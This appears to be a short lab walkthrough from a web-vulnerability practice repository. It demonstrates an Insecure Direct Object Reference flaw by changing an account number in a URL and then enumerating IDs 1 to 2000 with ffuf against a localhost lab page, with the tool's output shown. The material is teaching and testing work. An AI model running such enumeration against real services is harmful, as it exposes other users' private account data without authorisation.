# IDOR - Insecure Direct Object Reference

- On login to the account we have got our account details.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/cac7160e-a5f3-48f5-aa00-ee08c6664c7e)

- On a quick look at the URL we have got an account with a number.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/edc9c12e-c0ea-4b43-b627-bb6c02ff4079)

- by changing the number to any random characters we got the details of another user easily.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/24c91d46-c2fa-4427-8df6-dd4c6ecd85b0)

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/f06b6298-605c-49ed-859e-b75108817d2d)

- To get details of all users we will make a file of 1-2000 numbers to exploit the account.
- For this, we will use Python code to create a file of numbers.

```python
python3 -c 'for i in range (1,2001): print (i)' > num.txt
```
- Now, we will use a tool named ffuf.
- Command: `ffuf -u 'http://localhost/labs/e0x02.php?account=FUZZ' -w num.txt -fs 849 | grep FUZZ`

```bash
└─$ ffuf -u 'http://localhost/labs/e0x02.php?account=FUZZ' -w num.txt -fs 849 | grep FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://localhost/labs/e0x02.php?account=FUZZ
 :: Wordlist         : FUZZ: /home/singhx/labs/PEH/XSS/num.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 849
________________________________________________

    * FUZZ: 1002
    * FUZZ: 1000
    * FUZZ: 1001
    * FUZZ: 1003
    * FUZZ: 1005
    * FUZZ: 1006
    * FUZZ: 1008
    * FUZZ: 1009
    * FUZZ: 1011
    * FUZZ: 1007
    * FUZZ: 1012
    * FUZZ: 1013
    * FUZZ: 1016
    * FUZZ: 1010
    * FUZZ: 1014
    * FUZZ: 1015
    * FUZZ: 1017
    * FUZZ: 1018
    * FUZZ: 1019
    * FUZZ: 1004
:: Progress: [2000/2000] :: Job [1/1] :: 51 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
- Now, we can copy the account number and see the account details of the user.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/e189c142-8d95-4ae8-bacb-18661d206856)

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/9a90e4c6-60a6-4a31-9187-197182c2913a)

- Similarly, we can check for other accounts too.
